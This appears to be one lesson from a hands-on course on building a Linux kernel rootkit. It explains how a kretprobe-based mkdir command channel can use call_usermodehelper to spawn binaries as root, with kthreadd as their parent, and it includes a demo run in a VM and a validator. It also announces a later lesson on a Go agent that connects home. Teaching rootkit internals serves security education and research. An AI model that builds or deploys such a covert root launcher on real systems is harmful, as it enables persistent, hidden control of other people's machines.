# L14: Usermode Helper

M01 gave you a complete local rootkit.
Every command requires typing mkdir in a shell on the target.
That means you need shell access first, and you type every command by hand.

The kernel can launch programs on its own.
If the kernel can start an agent binary, you never need to type another command.

## call_usermodehelper

The kernel uses `call_usermodehelper` to run userspace programs.
It is the same mechanism the kernel uses to load firmware and run modprobe.
You control the binary path, arguments, and environment.

```text
  mkdir("rklings.launch./tmp/agent")
       |
       v
  kretprobe entry
       |  parse "launch" command, arg = "/tmp/agent"
       |
       v
  call_usermodehelper("/tmp/agent", argv, envp, UMH_WAIT_EXEC)
       |
       v
  kernel spawns /tmp/agent as a new process
  (parent is kthreadd, PID 2)
```

The function signature:

```c
int call_usermodehelper(const char *path,
                        char **argv,
                        char **envp,
                        int wait);
```

`wait` controls blocking behavior:
- `UMH_WAIT_EXEC`: return after exec (not after the process exits).
  The process runs in the background.
- `UMH_WAIT_PROC`: block until the process exits.
  Never use this in a syscall handler: it deadlocks.
- `UMH_NO_WAIT`: fire and forget.
  No error reporting if exec fails.

`UMH_WAIT_EXEC` is the right choice.
It confirms the binary exists and is executable, then returns.

## argv and envp

Both are NULL-terminated string arrays, just like execve.
The first element of argv is the program name (convention: same as path).

```c
char *argv[] = { "/tmp/agent", NULL };
char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/bin", NULL };
```

The environment must include PATH or the process inherits an empty environment.
Minimal is fine: HOME and PATH.

## The mkdir command

`rklings.launch.<path>` triggers the launch.
The argument after "launch." is the absolute path to the binary.
Dots in the path work because the dispatcher uses longest-prefix matching:
"launch" matches, everything after the first dot is the argument.

```text
rklings.launch./tmp/agent    -> launch "/tmp/agent"
rklings.launch./bin/echo     -> launch "/bin/echo"
```

## You write

`main.c` (~100 lines added to M01 dispatcher base):

- `cmd_launch(const char *arg)`: validate path starts with "/", build argv/envp, call_usermodehelper
- Register "launch" in the command table

## API

```c
#include <linux/umh.h>

int call_usermodehelper(const char *path, char **argv, char **envp, int wait);

// Wait flags
UMH_WAIT_EXEC   // return after exec starts
UMH_WAIT_PROC   // block until process exits (NEVER in syscall context)
UMH_NO_WAIT     // fire and forget
```

## Test it

```
$ rklings run l14
root@vm:~# insmod rklings.ko
root@vm:~# echo '#!/bin/sh' > /tmp/test.sh && echo 'echo launched > /tmp/proof' >> /tmp/test.sh
root@vm:~# chmod +x /tmp/test.sh
root@vm:~# mkdir rklings.launch./tmp/test.sh && echo "exit: $?"
exit: 0
root@vm:~# cat /tmp/proof
launched
root@vm:~# dmesg | tail -2
rklings: launch: /tmp/test.sh
rklings: launch: ret=0
```

The process runs as root (kernel context).
Its parent is kthreadd (PID 2), not the shell.

```
root@vm:~# ps -eo pid,ppid,comm | grep test
  412     2 test.sh
```

## Validate

```
$ rklings validate l14
  [+] module loads
  [+] mkdir rklings.launch./tmp/test.sh spawns process
  [+] launched process created /tmp/proof
  [+] ping command still works
  [+] escalation command still works
  PASS
```

## Next

The kernel can launch a binary.
L15 builds that binary: a Go agent that connects home over mTLS.
